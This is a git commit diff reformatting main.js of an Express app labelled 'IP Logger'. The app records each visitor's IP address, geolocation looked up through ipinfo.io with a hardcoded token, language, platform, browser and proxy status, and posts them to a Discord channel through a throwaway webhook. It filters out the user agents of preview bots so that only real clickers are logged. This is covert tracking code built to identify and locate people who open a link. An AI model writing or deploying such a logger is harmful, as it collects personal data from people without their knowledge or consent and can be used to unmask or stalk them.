31403985365411841f7d8c5b749ecbee254ada7c
JohnWick000101 <127307440+JohnWick000101@users.noreply.github.com>
2023-03-19 17:36:11 -0400

    official completion, final cleaned + UA fixed

--- main.js
+++ main.js
@@ -1,43 +1,27 @@
-const express = require("express");
+const unwantedUserAgents = ["Vercelbot/0.1 (+https://vercel.com/)", "got (https://github.com/sindresorhus/got)"];
 const { Webhook, MessageBuilder } = require("discord-webhook-node");
 const fetch = require("isomorphic-fetch");
+const express = require("express");
 const app = express();
 
-const botToken = process.env.bot_token;
 const channelID = process.env.channel_id;
+const botToken = process.env.bot_token;
 const port = process.env.port || 3000;
-
-const unwantedUserAgents = [
-  "Vercelbot/0.1 (+https://vercel.com/)",
-  "got (https://github.com/sindresorhus/got)"
-];
 
 async function sendWebhook(channelID, embed) {
   const createUrl = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
-
   try {
     const createResponse = await fetch(createUrl, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        Authorization: `Bot ${botToken}`,
-      },
-      body: JSON.stringify({
-        name: "Logger Webhook",
-      }),
+      headers: { "Content-Type": "application/json", Authorization: `Bot ${botToken}` },
+      body: JSON.stringify({ name: "Logger Webhook" }),
     });
     const createData = await createResponse.json();
     const webhookUrl = `https://discord.com/api/v10/webhooks/${createData.id}/${createData.token}`;
-
-    const webhook = new Webhook(webhookUrl);
-    await webhook.send(embed);
-
-    const deleteUrl = `https://discord.com/api/v10/webhooks/${createData.id}/${createData.token}`;
-    await fetch(deleteUrl, {
+    await new Webhook(webhookUrl).send(embed);
+    await fetch(`https://discord.com/api/v10/webhooks/${createData.id}/${createData.token}`, {
       method: "DELETE",
-      headers: {
-        Authorization: `Bot ${botToken}`,
-      },
+      headers: { Authorization: `Bot ${botToken}` },
     });
   } catch (error) {
     console.error(`Error sending webhook: ${error}`);
@@ -48,16 +32,13 @@ async function sendWebhook(channelID, embed) {
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
-  const isUnwantedUserAgent = unwantedUserAgents.some((unwantedUserAgent) => userAgent.includes(unwantedUserAgent));
+  const isUnwantedUserAgent = unwantedUserAgents.some(unwantedUserAgent => userAgent.includes(unwantedUserAgent));
   if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
-  const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
-  const data = await response.json();
-  const { region, city, country, postal } = data;
+  const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`)).json();
   const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
   const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
-  
   try {
     const embed = new MessageBuilder()
       .setTitle("IP Logger")
@@ -74,7 +55,6 @@ app.get("/", async (req, res) => {
       .addField("Proxy/VPN", isProxy ? "Yes" : "No")
       .setColor("#5CDBF0")
       .setTimestamp();
-
     await sendWebhook(channelID, embed);
     res.send("Address Logged");
   } catch (error) {
@@ -83,6 +63,4 @@ app.get("/", async (req, res) => {
   }
 });
 
-app.listen(port, () => {
-  console.log(`App listening at http://localhost:${port}`);
-});
+app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
